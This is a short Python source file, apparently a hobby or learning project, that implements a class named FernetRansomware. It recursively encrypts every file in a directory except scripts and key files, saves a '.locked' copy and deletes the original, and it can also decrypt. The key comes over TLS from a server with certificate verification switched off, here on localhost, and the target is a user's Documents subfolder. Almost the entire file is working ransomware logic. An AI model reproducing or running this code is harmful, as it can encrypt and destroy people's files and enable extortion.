import os
import socket
import ssl
from cryptography.fernet import Fernet

class FernetRansomware:
    def __init__(self, key):
        self.cipher = Fernet(key)

    def encrypt_file(self, file_path):
        try:
            if file_path.endswith((".locked", ".py", ".crt", ".key")):
                return
            with open(file_path, "rb") as f:
                data = f.read()
            encrypted_data = self.cipher.encrypt(data)
            new_path = file_path + ".locked"
            with open(new_path, "wb") as f:
                f.write(encrypted_data)
            os.remove(file_path)
            print(f"Locked: {os.path.basename(file_path)}")
        except Exception as e:
            print(f"Encryption error: {e}")

    def decrypt_file(self, file_path):
        try:
            if not file_path.endswith(".locked"):
                return
            with open(file_path, "rb") as f:
                encrypted_data = f.read()
            decrypted_data = self.cipher.decrypt(encrypted_data)
            original_path = file_path.replace(".locked", "")
            with open(original_path, "wb") as f:
                f.write(decrypted_data)
            os.remove(file_path)
            print(f"Unlocked: {os.path.basename(original_path)}")
        except Exception as e:
            print(f"Decryption error: {e}")

    def run_action(self, dir_path, mode="encrypt"):
        current_script = os.path.basename(__file__)
        for root, _, files in os.walk(dir_path):
            for file in files:
                if file == current_script or file.endswith((".py", ".crt", ".key")):
                    continue
                full_path = os.path.join(root, file)
                if mode == "encrypt":
                    self.encrypt_file(full_path)
                elif mode == "decrypt":
                    self.decrypt_file(full_path)

if __name__ == "__main__":
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        with socket.create_connection(("127.0.0.1", 8080)) as sock:
            with context.wrap_socket(sock, server_hostname="127.0.0.1") as securesock:
                key = securesock.recv(1024)
        
        client = FernetRansomware(key)
        target = r"C:\Users\noam2\Documents\TryingToDelete"
        
        mode = "decrypt" 
        
        print(f" Mode: {mode}")
        client.run_action(target, mode=mode)
        print("Finished.")
            
    except Exception as e:
        print(f"Error: {e}")